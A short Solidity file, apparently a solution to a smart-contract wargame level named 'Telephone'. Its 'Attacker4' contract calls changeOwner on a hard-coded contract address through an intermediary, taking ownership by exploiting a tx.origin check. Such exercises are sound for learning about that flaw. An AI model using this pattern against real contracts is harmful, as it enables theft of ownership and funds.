// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Telephone {
    function changeOwner(address _owner) public virtual;
}

contract Attacker4 {
    Telephone target = Telephone(0x90429046BD403440B6a3672A4eFdcfA922650115);

    function attack() external {
        target.changeOwner(msg.sender);
    }
}
